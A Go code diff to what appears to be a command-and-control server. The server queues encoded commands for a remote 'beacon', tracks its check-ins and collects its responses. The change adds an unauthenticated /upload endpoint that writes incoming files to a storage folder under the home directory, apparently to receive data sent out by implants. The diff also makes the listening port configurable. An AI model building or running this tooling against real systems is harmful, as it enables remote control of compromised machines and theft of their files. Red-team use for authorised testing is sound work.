@@ -2,7 +2,11 @@ package main
 
 import (
 	"fmt"
+	"io"
 	"net/http"
+	"os"
+	"path/filepath"
+	config "redbull"
 	"redbull/internal/rbhttp"
 	"redbull/internal/rbqueue"
 	"time"
@@ -11,16 +15,31 @@ import (
 	"github.com/go-chi/chi/v5/middleware"
 	"github.com/go-chi/cors"
 	"github.com/go-chi/render"
+	"github.com/google/uuid"
 	"go.uber.org/zap"
 )
 
 var cmdQueue = rbqueue.NewQueue[string]()
 var responses = rbhttp.NewBeaconResponses()
 var lastCheckIn time.Time
+var fileStoragePath string
 
 func init() {
 	logger := zap.Must(zap.NewDevelopment())
 	zap.ReplaceGlobals(logger)
+
+	// Set up file storage path in $HOME/.redbull/files
+	homeDir, err := os.UserHomeDir()
+	if err != nil {
+		zap.L().Fatal("Failed to get home directory", zap.Error(err))
+	}
+	fileStoragePath = filepath.Join(homeDir, ".redbull", "files")
+
+	// Create the directory if it doesn't exist
+	if err := os.MkdirAll(fileStoragePath, 0755); err != nil {
+		zap.L().Fatal("Failed to create file storage directory", zap.Error(err), zap.String("path", fileStoragePath))
+	}
+	zap.L().Info("File storage initialized", zap.String("path", fileStoragePath))
 }
 
 func errorResponse(w http.ResponseWriter, r *http.Request, status int, msg string) {
@@ -49,6 +68,31 @@ func checkIn(w http.ResponseWriter, r *http.Request) {
 	command, _ := cmdQueue.Pop()
 	encodedCmd := rbhttp.EncodeCommand(command)
 	render.JSON(w, r, rbhttp.CheckInResponse{Command: encodedCmd})
+}
+
+func uploadFile(w http.ResponseWriter, r *http.Request) {
+	// Create destination file
+	filePath := filepath.Join(fileStoragePath, uuid.New().String())
+	destFile, err := os.Create(filePath)
+	if err != nil {
+		zap.L().Error("uploadFile - create file", zap.Error(err))
+		errorResponse(w, r, 500, fmt.Sprintf("failed to create file: %v", err))
+		return
+	}
+	defer destFile.Close()
+
+	// Stream directly from request body to disk
+	_, err = io.Copy(destFile, r.Body)
+	if err != nil {
+		zap.L().Error("uploadFile - copy file", zap.Error(err))
+		// Clean up partial file on error
+		os.Remove(filePath)
+		errorResponse(w, r, 400, fmt.Sprintf("failed to write file: %v", err))
+		return
+	}
+
+	render.Status(r, 200)
+	render.JSON(w, r, rbhttp.NewCommandResponse{Success: true})
 }
 
 func response(w http.ResponseWriter, r *http.Request) {
@@ -107,7 +151,8 @@ func main() {
 	r.Post("/command", newCommand)
 	r.Get("/responses", fetchResponses)
 	r.Get("/last_checkin", getLastCheckin)
+	r.Post("/upload", uploadFile)
 
-	zap.L().Info("Running on 0.0.0.0:8000")
-	http.ListenAndServe(":8000", r)
+	zap.L().Info("Server running", zap.Int("port", config.PORT_NUMBER))
+	http.ListenAndServe(fmt.Sprintf("0.0.0.0:%d", config.PORT_NUMBER), r)
 }
